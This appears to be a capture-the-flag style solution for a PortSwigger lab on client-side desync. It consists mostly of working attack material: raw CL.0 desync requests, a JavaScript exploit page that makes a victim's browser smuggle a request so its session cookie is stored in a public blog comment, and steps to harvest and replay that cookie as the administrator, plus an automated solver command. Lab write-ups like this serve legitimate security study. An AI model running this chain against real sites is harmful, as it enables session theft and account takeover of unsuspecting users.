# Solution — Client-side desync (Expert)

Instance shape used for the verified run: language prefix `/en`, post id `5`,
exploit server on `*.exploit-server.net`. Every value below is discovered by the
solver at runtime; replace `<lab>` with your own instance host.

## 1. Find the CL.0 vector

Send a request head with a body-length promise and no body, over a raw
TLS socket:

```
POST / HTTP/1.1
Host: <lab>
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Connection: keep-alive
```

The server answers immediately:

```
HTTP/1.1 302 Found
Location: /en
Content-Length: 0
```

It never waited for the 40 bytes, so the socket is now desynchronised: anything
already sent after the head is parsed as the next request. Control: the same
trick against `/en/post?postId=5` (or `/en`, `/en/login`) just blocks — those
handlers read their body.

> `ssl` + `socket` is enough; `Content-Length: 40` with a 2 s read timeout
> separates "answered early" (vector) from "waited" (no vector).

## 2. Confirm the desync on your own connection

```
POST / HTTP/1.1
Host: <lab>
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

GET /404pls HTTP/1.1
X-Foo: x
```

Send it on one connection, then send a second request on the same socket: the
reply that comes back belongs to `GET /404pls`, not to the second request.

## 3. The storage gadget

The blog comment form stores arbitrary text publicly:

```
POST /en/post/comment HTTP/1.1
Host: <lab>
Cookie: session=<your session>
Content-Type: application/x-www-form-urlencoded
Content-Length: <body + slack>

csrf=<token>&postId=5&name=<marker>&email=a%40b.com&website=&comment=
```

`Content-Length` is deliberately larger than the body: the request is left
**hanging** until extra bytes arrive. Whatever arrives is appended to the
comment text.

## 4. Deliver the chain to the victim

Store this page on the exploit server (`/exploit`, `Content-Type: text/html`)
and press *Deliver exploit to victim*:

```html
<script>
const LAB = "https://<lab>";
const SMUGGLED = "POST /en/post/comment HTTP/1.1\r\n"
  + "Host: <lab>\r\n"
  + "Cookie: session=<your session>\r\n"
  + "Content-Type: application/x-www-form-urlencoded\r\n"
  + "Content-Length: <body length + 800>\r\n"
  + "Connection: keep-alive\r\n\r\n"
  + "csrf=<token>&postId=5&name=<marker>&email=a%40b.com&website=&comment=";
fetch(LAB + "/", {method: "POST", body: SMUGGLED, mode: "cors", credentials: "include"})
  .catch(() => {
    fetch(LAB + "/en/post?postId=5", {mode: "no-cors", credentials: "include"});
  });
</script>
```

* the smuggle is carried in the body of `POST /`, which the server ignores;
* the `catch` fires because the cross-origin, credentialled `POST /` cannot be
  read (302 → `/en`, no `Access-Control-Allow-Origin`);
* the follow-up `fetch` reuses the poisoned connection, so its request line and
  headers — `Cookie: session=…` included — are appended to the hanging comment
  and stored.

The `Content-Length` slack has to be big enough to reach the `Cookie` header but
smaller than the whole follow-up request. With Chrome's follow-up request
(~1.2 kB, cookie just past the halfway point) `+800` worked first try; the
solver retries with `+700`, `+950`, `+1100`, `+1300` if a delivery produces no
leak.

## 5. Harvest and replay

```
GET /en/post?postId=5
```

The comment named `<marker>` now contains the victim's raw request. Extract
`session=([A-Za-z0-9]{16,64})` (skip your own value), then:

```
GET /my-account
Cookie: session=<victim session>
```

```
HTTP/1.1 200 OK
...
<h1>My Account</h1>
Your username is: administrator
```

The widget switches to `is-solved` at the same time; the solver requires both.

## One command

```bash
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<lab-id>.web-security-academy.net/"
```

Verified result: exit 0, 5.8 s, 12 HTTP requests, first attempt.
